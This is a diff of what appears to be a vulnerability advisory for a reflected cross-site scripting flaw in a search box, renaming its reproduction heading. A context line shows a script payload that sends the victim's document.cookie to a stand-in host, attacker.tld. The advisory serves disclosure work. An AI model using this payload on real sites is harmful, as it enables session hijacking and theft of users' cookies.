@@ -17,7 +17,7 @@ An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists i
   cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
 ```
 
-## Steps to Reproduce
+## POC / Steps to Reproduce
 1. Interact with the search box and observe whether the input `cybrnoob'"<>` is reflected in the source.
     <img width="1512" height="982" alt="SCR-20261119-miho" src="https://github.com/user-attachments/assets/db539897-139d-465b-a1ca-21db05096077" />
 2. Inject javascript in the search box to verify if it is executed.
